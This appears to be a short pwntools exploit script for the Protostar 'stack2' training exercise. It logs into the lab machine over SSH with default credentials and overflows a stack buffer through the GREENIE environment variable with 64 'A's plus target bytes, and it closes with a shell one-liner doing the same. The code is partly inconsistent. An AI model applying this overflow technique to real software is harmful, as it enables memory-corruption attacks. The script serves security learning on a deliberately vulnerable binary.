#!/usr/bin/env python
from pwn import *
import sys
import time
'''
if len(sys.argv) < 2:
    print("usage: ./%s <ip>" % sys.argv[0])
else:
    s = ssh("user", sys.argv[1], 22, password="user")
#    payload = 'export GREENIE=\"' + "A"*64
#    payload += p32(0x0d0a0d0a)
#    payload += "\""
    s.run(payload)
#    s.run('export GREENIE=\"{}\"'.format(payload))
    s.interactive()
    r = s.run('/opt/protostar/bin/stack2')
    print(r.recv(1024))
    r.close()
'''
#### use export to define enviroment variable like this
#### export GREENIE="""$(python -c 'print("A"*64 + "\x0a\x0d\x0a\x0d")')"""
#### and then run binary
